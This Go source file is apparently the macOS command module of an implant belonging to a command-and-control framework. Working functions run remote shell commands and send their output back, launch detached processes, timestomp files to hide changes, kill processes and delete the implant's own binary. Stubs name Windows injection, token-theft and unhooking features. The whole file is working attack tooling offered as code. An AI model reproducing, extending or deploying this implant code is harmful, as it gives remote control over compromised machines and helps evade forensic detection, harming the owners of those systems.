//go:build darwin

package commands

import (
	"bytes"
	"errors"
	"fmt"
	"implant/core/communication"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"
)

func Shell(path string, args []byte) ([]byte, error) {
	path = "/bin/sh"
	args = bytes.ReplaceAll(args, []byte("/C"), []byte("-c"))
	args = bytes.Trim(args, " ")
	startPos := bytes.Index(args, []byte("-c"))
	args = args[startPos+3:]
	argsArray := []string{"-c", string(args)}
	cmd := exec.Command(path, argsArray...)
	stdout, err := cmd.StdoutPipe()
	cmd.Stderr = cmd.Stdout
	if err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}
	if err = cmd.Start(); err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}

	var buf []byte
	var count int
	time.Sleep(500 * time.Millisecond)
	buf = make([]byte, 1024*50)
	count, err = stdout.Read(buf)
	communication.DataProcess(0, buf[:count])
	for {
		buf = make([]byte, 1024*50)
		count, err = stdout.Read(buf)
		if err != nil {
			break
		}
		communication.DataProcess(0, append([]byte("[+] "+string(path)+" "+string(args)+" :\n"), buf[:count]...))
		time.Sleep(5000 * time.Millisecond)
	}

	if err = cmd.Wait(); err != nil {
		return nil, errors.New("exec failed with: " + err.Error())
	}

	return []byte("success"), nil

}

// Execute 执行 `execute "<程序>" [参数...]`：后台启动、脱离当前会话，不等待退出。
func Execute(b []byte) ([]byte, error) {
	parts := SplitCommandLine(string(b))
	if len(parts) == 0 {
		return nil, errors.New("execute: empty command")
	}
	cmd := exec.Command(parts[0], parts[1:]...)
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}
	if err := cmd.Start(); err != nil {
		return nil, fmt.Errorf("execute failed: %v", err)
	}
	_ = cmd.Process.Release()
	return []byte("success execute " + strings.Join(parts, " ")), nil
}

func TimeStomp(from []byte, to []byte) ([]byte, error) {
	cmd := exec.Command("/bin/bash", "-c", fmt.Sprintf("touch -c -r %s %s", string(from), string(to)))
	err := cmd.Start()
	if err != nil {
		return nil, err
	}
	return []byte(fmt.Sprintf("timestomp %s to %s", from, to)), nil
}

func Run(b []byte, Token uintptr, argues map[string]string) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func Drives() ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func PowershellImport(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func PowershellPort(portByte []byte, b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func EncryptHeap() ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func DoSuspendThreads() ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func DoResumeThreads() ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func ExecuteAssembly(assemblyBytes []byte, arguments string, execTaskID uint32) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func InjectProcess(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func Spawn_x64(sh []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func HandlerJob(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func Steal_token(pid uint32) (uintptr, []byte, error) {
	return 0, nil, errors.New("This function is not supported on this platform now.")
}

func Run2self() (bool, error) {
	return false, errors.New("This function is not supported on this platform now.")
}

func Make_token(b []byte) (uintptr, error) {
	return 0, errors.New("This function is not supported on this platform now.")
}

func Spawn_X86(sh []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func Spawn_X64(sh []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func KillProcess(pid uint32) ([]byte, error) {
	err := syscall.Kill(int(pid), 15)
	if err != nil {
		return nil, errors.New("process" + strconv.Itoa(int(pid)) + "not found")
	}
	return []byte("kill " + strconv.Itoa(int(pid)) + " success"), nil
}

func DllInjectSelf(params []byte, b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func DllInjectProcess(params []byte, b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func InjectProcessRemote(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func DeleteSelf() ([]byte, error) {
	filename, err := os.Executable()
	if err != nil {
		return nil, err
	}
	Path := strings.ReplaceAll(string(filename), "\\", "/")
	err = os.RemoveAll(Path)
	if err != nil {
		return nil, errors.New("Remove failed")
	}
	return []byte("Remove " + string(filename) + " success"), nil
}

// DeleteSelfAndExit darwin：unlink 运行中文件安全，删除即完成（退出由调用方 os.Exit 承担）
func DeleteSelfAndExit() ([]byte, error) {
	return DeleteSelf()
}

func HideConsole() error {
	//return errors.New("this platform not supports HideConsole now.")
	return nil
}

func GetPrivs(privs []string, stolenToken uintptr) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func SetProcessDPIAware() error {
	//return errors.New("SetProcessDPIAware is not supported on this platform now.")
	return nil
}

func Runu(b []byte) ([]byte, error) {
	return nil, errors.New("This function is not supported on this platform now.")
}

func FullUnhook() error {
	return errors.New("Unhooking is not supported on this platform now.")
}

func ExecuteLinuxScript(scriptBytes []byte, args string) ([]byte, error) {
	return nil, errors.New("Linux脚本执行功能在当前平台不可用")
}

func ExecuteLinuxBin(binBytes []byte, args string) ([]byte, error) {
	return nil, errors.New("Linux二进制执行功能在当前平台不可用")
}

// ExecuteBof BOF(COFF)执行(仅Windows)
func ExecuteBof(coffBytes []byte, args string) ([]byte, error) {
	return nil, errors.New("BOF(COFF)执行功能在当前平台不可用(仅Windows)")
}

func ExecuteFile(fileBytes []byte, args string) ([]byte, error) {
	return nil, errors.New("文件执行功能在当前平台不可用")
}
